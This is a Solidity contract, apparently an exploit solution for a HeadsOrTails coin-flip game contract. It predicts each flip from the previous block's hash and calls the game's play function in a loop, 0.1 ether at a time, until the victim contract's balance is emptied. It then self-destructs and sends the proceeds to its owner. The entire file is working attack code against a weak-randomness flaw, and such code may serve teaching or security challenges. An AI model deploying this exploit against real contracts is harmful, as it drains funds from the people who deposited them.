pragma solidity 0.4.24;

import "./HeadsOrTails.sol";

contract HeadsOrTailsExploit {
    address public owner;
    address public victim_addr;

    constructor(address addr){
        owner = msg.sender;
        victim_addr = addr;
    }
    function () payable{}
    function exploit() external payable{
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        while(address(victim_addr).balance >0){
            HeadsOrTails(victim_addr).play.value(.1 ether)(coinFlip == 1);
        }
        selfdestruct(owner);
    }
}